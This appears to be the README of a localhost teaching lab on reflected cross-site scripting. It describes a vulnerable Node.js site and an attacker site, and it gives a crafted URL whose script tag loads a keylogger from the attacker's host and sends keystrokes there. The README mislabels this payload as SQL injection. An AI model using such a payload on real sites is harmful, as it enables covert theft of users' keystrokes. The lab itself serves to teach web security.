# XSS REFLECTED
"This deals with reflected XSS vulnerabilities. You will find a vulnerable Node.js website and an attacking website. The attacker sends a link to the victim. This link executes a keylogger present on the attacker's site. The keystrokes are transmitted to the attacker's website. The URL of the site is http://localhost:3000, and the URL with the SQL injection sent to the victim is : 
http://localhost:3000/?name=<script src="http://localhost:3001/keylogger.js\"></script>."
